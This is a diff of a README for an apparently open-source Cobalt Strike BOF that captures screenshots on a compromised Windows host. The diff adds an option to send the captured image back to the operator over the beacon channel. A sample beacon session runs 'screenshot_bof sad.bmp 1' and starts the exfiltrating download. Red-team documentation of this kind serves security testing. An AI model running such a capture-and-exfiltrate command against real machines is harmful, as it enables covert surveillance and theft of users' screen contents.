@@ -9,15 +9,19 @@ An alternative screenshot capability for Cobalt Strike that uses WinAPI and does
 
 ## Usage
 1. import the screenshotBOF.cna script into Cobalt Strike
-2. use the command screenshot_bof {local filename}
+2. use the command screenshot_bof {local filename} {save method 0/1}
+
+Save methods:
+0. drop file to disk
+1. download file over beacon (Cobalt Strike only)
 ```
-beacon> screenshot_bof sad.bmp
+beacon> screenshot_bof sad.bmp 1
 [*] Running screenshot BOF by (@codex_tf2)
-[+] host called home, sent: 4860 bytes
+[+] host called home, sent: 5267 bytes
 [+] received output:
-[*] Tasked beacon to printscreen and save to sad.bmp
+[*] Screen saved to bitmap
 [+] received output:
-[+] PrintScreen saved to bitmap...
+[*] Downloading bitmap over beacon with filename sad.bmp
 [*] started download of sad.bmp
 ```
 
@@ -31,3 +35,4 @@ Cobalt Strike uses a technique known as fork & run for many of its post-ex capab
 - Made using https://github.com/securifybv/Visual-Studio-BOF-template
 - Save BMP to file from https://stackoverflow.com/a/60667564
 - in memory download from https://github.com/anthemtotheego/CredBandit
+- @BinaryFaultline for BMP rendering in aggressorscript, and screenshot callback branch
